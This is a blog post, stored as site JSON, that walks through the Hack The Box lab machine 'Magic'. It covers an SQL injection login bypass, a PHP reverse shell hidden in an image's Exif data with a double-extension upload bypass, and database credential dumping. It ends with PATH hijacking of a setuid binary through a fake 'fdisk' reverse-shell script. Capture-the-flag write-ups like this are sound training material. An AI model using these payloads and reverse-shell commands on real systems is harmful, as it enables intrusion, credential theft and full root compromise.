{"componentChunkName":"component---src-components-blog-entry-js","path":"/2020-08-22-HTB-Magic/","result":{"data":{"markdownRemark":{"html":"<p>Let’s get right into it.</p>\n<h1>Reconnaissance</h1>\n<p>For recon, we start we NMAP to see what ports are open. The result reveal 2 ports.</p>\n<pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)\n|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)\n|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Magic Portfolio\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n<p>From previous experience, I know that we would have to exploit the HTTP server at port 80 and maybe we can ssh to the box later after we have a user’s credential (or in some cases after we add our ssh public key to the server).</p>\n<p>Navigating to the page at port 80, you will see that it is some form of an image hosting platform. The homepage indicates that you can upload images if you login.</p>\n<p><img src=\"/static/homepage-b2928dc581e928cba122e6f9b0dcfade.png\" alt=\"http://10.10.10.185\"></p>\n<p>From here you can navigate to the login page. You will be presented with a form for username and password. This form is vulnerable to SQL injection; this will be our way in.</p>\n<p><img src=\"/static/login-fb823dd5b95f32d2e33a4e477a7038bf.png\" alt=\"http://10.10.10.185/login.php\"></p>\n<p>With the username set to the SQL command for injection (<strong>‘ OR 1=1;</strong>), we can pass anything for password. You will be presented with a page to upload an image.</p>\n<p><img src=\"/static/upload-761ab41637568b892e859444810cc31d.png\" alt=\"http://10.10.10.185/upload.php\"></p>\n<p>Now we can start thinking about what can we give to the server that would allow us to run commands such as initiating a reverse shell. You can try uploading random files but you will quickly realize that the server only accepts the following</p>\n<blockquote>\n<p>Sorry, only JPG, JPEG &#x26; PNG files are allowed.</p>\n</blockquote>\n<p>You might think, what if I upload a php file with the “.jpg” file extension? That is also not allowed and you will get the following error</p>\n<blockquote>\n<p>What are you trying to do there?</p>\n</blockquote>\n<p>Now the conversation becomes, how can I pass a legit image file that contains code that can be executed by the server. Since we know this is a php web-server, this code has to be php code.</p>\n<hr>\n<h1>Foothold</h1>\n<p>Now that we have a goal in mind, it is time to get to work. Searching on the internet you can see there is already a tool that allows us to embed data into images; <a href=\"https://exiftool.org/\">ExifTool</a>.</p>\n<blockquote>\n<p>ExifTool is a platform-independent Perl library plus a command-line application for reading, writing and editing meta information in a wide variety of files</p>\n</blockquote>\n<p>The php code that we will be adding to the image is a follows</p>\n<pre><code>&#x3C;?php echo 'Initiating Shell'; system(\\\"nohup bash -c 'bash -i >&#x26; /dev/tcp/&#x3C;ip address>/&#x3C;port> 0>&#x26;1'\\\");__halt_compiler();?>\n</code></pre>\n<p>This code will connect back to the ip address hardcode facilitating a reverse shell. With this in hand, we can overwrite one of the standard Exif tag of the image; <strong>DocumentName</strong>.</p>\n<pre><code>exiftool -DocumentName=\"&#x3C;h1>Test&#x3C;br>&#x3C;?php echo 'Initiating Shell'; system(\\\"nohup bash -c 'bash -i >&#x26; /dev/tcp/10.10.14.5/1337 0>&#x26;1'\\\");__halt_compiler();?>&#x3C;/h1>\" exploit-image.jpeg\n</code></pre>\n<p>This will create a copy of the original image (named exploit-image.jpeg_original) and edit the Exif tag of the image. This image will pass the upload validation process but when you navigate to the image, it will not execute. This is because when we request the page the server only recognize the file as an image. If we want it to be interpreted as a php file, we will need to add the .php extension to the file as follows “<strong>exploit-image.php.jpeg</strong>”.</p>\n<p>This will pass the image validation and when we request the page, the server will interpret this as a valid php file first before it try to parse it as a image.(it contains php code — see with strings exploit-image.php.jpeg). When evaluated as a PHP file we get the shell initiated. To trigger the shell, navigate to the following endpoint.</p>\n<blockquote>\n<p><a href=\"http://10.10.10.185/images/uploads/exploit-image.php.jpeg\">http://10.10.10.185/images/uploads/exploit-image.php.jpeg</a></p>\n</blockquote>\n<p>Boom! we have shell.</p>\n<pre><code>kali@kali:~/HTB/Magic$ nc -lvnp 1337\nlistening on [any] 1337 ...\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.10.185] 33868\nbash: cannot set terminal process group (1168): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@ubuntu:/var/www/Magic/images/uploads$\n</code></pre>\n<hr>\n<h1>Enumeration</h1>\n<p>Poking around, you will find a db.php file in “/var/www/Magic”. This file contains the credentials to the database.</p>\n<pre><code>private static $dbName = 'Magic' ;\nprivate static $dbHost = 'localhost' ;\nprivate static $dbUsername = 'theseus';\nprivate static $dbUserPassword = 'iamkingtheseus';\n</code></pre>\n<p>The MySQL client is not installed on the box so we have to find another way to view the contents of the database. Luckily we have “mysqldump” installed. With this we can dump the contents of the DB to a file.</p>\n<pre><code>www-data@ubuntu:/var/www/Magic/images/uploads$ mysqldump -u theseus -p Magic > db.dump\n&#x3C;es/uploads$ mysqldump -u theseus -p Magic > db.dump\nEnter password: iamkingtheseus\n</code></pre>\n<p>Since this file is in the “images/uploads” we can easily download it to inspect it. Or you can just run <strong>strings</strong> against the dump. This will reveal the password of a admin user.</p>\n<pre><code>/*!40000 ALTER TABLE `login` DISABLE KEYS */;\nINSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');\n/*!40000 ALTER TABLE `login` ENABLE KEYS */;\n</code></pre>\n<p>Checking the home directory you will see there is only one user.</p>\n<pre><code>cd /home\nwww-data@ubuntu:/home$ ls\nls\ntheseus\n</code></pre>\n<hr>\n<h1>User Privesc</h1>\n<p>At this point you have 2 potential password for user privesc. Before we can switch user, we have to get a full TTY shell.</p>\n<pre><code>www-data@ubuntu:/home$ su theseus\nsu theseus\nsu: must be run from a terminal\nwww-data@ubuntu:/home$ /usr/bin/script -qc /bin/bash /dev/null\n/usr/bin/script -qc /bin/bash /dev/null\n</code></pre>\n<p>Now you can get the user flag</p>\n<pre><code>www-data@ubuntu:/home$ su theseus\nsu theseus\nPassword: Th3s3usW4sK1ng\ntheseus@ubuntu:/home$ cd theseus\ncd theseus\ntheseus@ubuntu:~$ ls -al\nls -al\ntotal 84\ndrwxr-xr-x 15 theseus theseus 4096 Apr 16 02:58 .\ndrwxr-xr-x  3 root    root    4096 Oct 15  2019 ..\nlrwxrwxrwx  1 theseus theseus    9 Oct 21  2019 .bash_history -> /dev/null\n-rw-r--r--  1 theseus theseus  220 Oct 15  2019 .bash_logout\n-rw-r--r--  1 theseus theseus   15 Oct 21  2019 .bash_profile\n-rw-r--r--  1 theseus theseus 3771 Oct 15  2019 .bashrc\ndrwxrwxr-x 13 theseus theseus 4096 Mar 13 05:57 .cache\ndrwx------ 13 theseus theseus 4096 Oct 22  2019 .config\ndrwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Desktop\ndrwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Documents\ndrwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Downloads\ndrwx------  3 theseus theseus 4096 Oct 21  2019 .gnupg\n-rw-------  1 theseus theseus 7334 Apr 15 23:50 .ICEauthority\ndrwx------  3 theseus theseus 4096 Oct 21  2019 .local\ndrwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Music\ndrwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Pictures\ndrwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Public\ndrwx------  2 theseus theseus 4096 Oct 21  2019 .ssh\ndrwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Templates\n-r--------  1 theseus theseus   33 Aug 21 20:23 user.txt\ndrwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Videos\n</code></pre>\n<hr>\n<h1>More Enumeration</h1>\n<p>At this point you can add a public key to “~/.ssh/authorized_keys” so that you can ssh to the box directly.</p>\n<p>For enumeration at the point I chose LinPeas. Two interesting tidbits were revealed. The first,</p>\n<pre><code>[+] Readable files belonging to root and readable by me but not world readable\n-rwsr-x--- 1 root users 22040 Oct 21 2019 /bin/sysinfo\n</code></pre>\n<p>For this we can try to read the content of “sysinfo” to see if we can tamper with it; more on this later. Also we can execute this file with its sticky bit. This means that “sysinfo” runs as root; this is good news for us. The second</p>\n<pre><code>[+] PATH\n[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\nNew path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\n</code></pre>\n<p>This reveal that we can change the load path. This makes it possible to hijack the load path and replace a legit executable with a rogue one.</p>\n<p>When you view the content of sysinfo, you will see it executes some commands by just the name and not the full path.</p>\n<pre><code>strings /bin/sysinfo\n====================Hardware Info====================\nlshw -short\n====================Disk Info====================\nfdisk -l\n====================CPU Info====================\ncat /proc/cpuinfo\n====================MEM Usage=====================\n</code></pre>\n<p>Since a full path is not used, it is up to the OS to resolve what executable is used. This is the main use of the PATH variable. The OS looks for the executable in each directory listed in path.</p>\n<p>We can abuse this coupled with the fact that we can add a path to present a phony executable for “fdisk”</p>\n<hr>\n<h1>Root Privesc</h1>\n<p>From here on, we can create an executable with the name “fdisk”. In our case this executable will create a reverse shell.</p>\n<pre><code>theseus@ubuntu:/var/tmp$ cat fdisk\n#!/bin/bash\nnohup bash -c 'bash -i >&#x26; /dev/tcp/&#x3C;ip address>/&#x3C;port> 0>&#x26;1'\ntheseus@ubuntu:/var/tmp$ chmod +x fdisk\n</code></pre>\n<p>Then we manipulate the path to include the directory that contains the phony “fdisk”. In this case append “/var/tmp” to the path.</p>\n<pre><code>theseus@ubuntu:/var/tmp$ which fdisk\n/sbin/fdisk\ntheseus@ubuntu:/var/tmp$ export PATH=$(pwd):$PATH\ntheseus@ubuntu:/var/tmp$ which fdisk\n/var/tmp/fdisk\n</code></pre>\n<p>All that is left is to execute “sysinfo” and then get a shell.</p>\n<pre><code>theseus@ubuntu:/var/tmp$ sysinfo\n====================Hardware Info====================\nH/W path           Device      Class      Description\n=====================================================\n                               system     VMware Virtual Platform\n/0                             bus        440BX Desktop Reference Platform\n/0/0                           memory     86KiB BIOS\n/0/1                           processor  AMD EPYC 7401P 24-Core Processor\n/0/1/0                         memory     16KiB L1 cache\n/0/1/1                         memory     16KiB L1 cache\n/0/1/2                         memory     512KiB L2 cache\n...\n</code></pre>\n<p>Boom, we have another shell.</p>\n<pre><code>kali@kali:~/HTB/Magic$ nc -lvnp 1337\nlistening on [any] 1337 ...\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.10.185] 33876\nroot@ubuntu:/var/tmp#\nroot@ubuntu:/var/tmp# ls -al /root\nls -al /root\ntotal 44\ndrwx------  5 root root 4096 Apr 16 00:23 .\ndrwxr-xr-x 24 root root 4096 Mar 20 15:27 ..\nlrwxrwxrwx  1 root root    9 Oct 21  2019 .bash_history -> /dev/null\n-rw-r--r--  1 root root   15 Oct 21  2019 .bash_profile\n-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc\ndrwx------  2 root root 4096 Oct 21  2019 .cache\ndrwx------  3 root root 4096 Oct 21  2019 .gnupg\n-r--------  1 root root 1085 Oct 21  2019 info.c\ndrwxr-xr-x  3 root root 4096 Oct 21  2019 .local\n-rw-------  1 root root   18 Mar 17 08:57 .mysql_history\n-r--------  1 root root   33 Aug 21 20:23 root.txt\n-rw-r--r--  1 root root   66 Apr 16 00:24 .selected_editor\n</code></pre>\n<p>That’s all for this one, till the next.</p>\n<p><img src=\"https://media.giphy.com/media/3EfgWHj0YIDrW/giphy.gif\" alt=\"minion\"></p>","frontmatter":{"path":"/htb-magic","title":"Hack The Box - Magic","date":"08/22/2020","featuredImage":{"childImageSharp":{"fluid":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsSAAALEgHS3X78AAACrElEQVQoz2Pg4eUDIj4+fjZOXgZGLgYWbgYmLgZmLm5ePl4+fogsBHHz8HJx8wBJIIKIMPCAFPEB9egqibRFqS7K1ZmbrZPlqSjAz8/KwQM0Fa5TSFhEQlJKVEycj18Aqhmok4WdpypUdUWR+dQK39ntETNr/GbkOmyqMLLQkmBiB+kHOoGTi1teQdHdw9PaxlZcXIIT5DJ+BgZm7gJf5T3NDj7W4akGPgUm9hE6lh564ZUxIYdaLeQlhNi5eKVl5eUUVWQVVJRUNfUMjFU1dRVUNCRl5BlkxQUXF5p6GHnlhLfsyit6kpt4JCViSn7T8mU7JxZGVAUrM7HziolLSMspAJGMvIK2lrK8goK4pLSwqDhDhJ3s5lrHYJuMVPfKDZMW/b+85vmS3gkZPa/2rmnPyDjcYiogwC8gJCKroCSnoCwhJa2qICErLS4gJCogKMyQ56e0vdol1jG3L6N5au3ULyeWHO5rLAiqeLR1WWty1uVeK3ERQQkZRaA71bX1VTS0lTTVZBXV5JU1pOUUGcLtZDbVueyaPv3y8p6Gxsb/S2aubajKLyvfsWNXcVrK8TYzIUEBbh4+EVExGTkFICkmLikpJQNEoACTFhNYUmy2bUL16q7a+OjY+90TmuKT6lubD5+6PLk6vjFMmZmdV0pGFhhgiqoaiqqayupaalq66lp6oAADhnaRn/LeFkd//yD/yKQZqzfG5ZbmVzXvWjX9cIuZprwIKyevuISUhLQsEEnJKkjLKwL9L6ugLCYhBUokzOw83fEay0ptphR5retNm1EVPL088GCzhbO+OAMrDz8/PzBhQREXNycUAXk8DLyQtMLCba0lNiVVc02p3vIivWRnWTFBPmY2Hj5+PuQUioYYIBTQ90ClwLTNyMoDTNhAv7ADkxBq2sZEACsrqStzaP0oAAAAAElFTkSuQmCC","aspectRatio":1.5748031496062993,"src":"/static/535b84723287a495d7189ded90de599f/ee604/magic.png","srcSet":"/static/535b84723287a495d7189ded90de599f/69585/magic.png 200w,\n/static/535b84723287a495d7189ded90de599f/497c6/magic.png 400w,\n/static/535b84723287a495d7189ded90de599f/ee604/magic.png 800w,\n/static/535b84723287a495d7189ded90de599f/7eec6/magic.png 1196w","sizes":"(max-width: 800px) 100vw, 800px"}}}}}},"pageContext":{}}}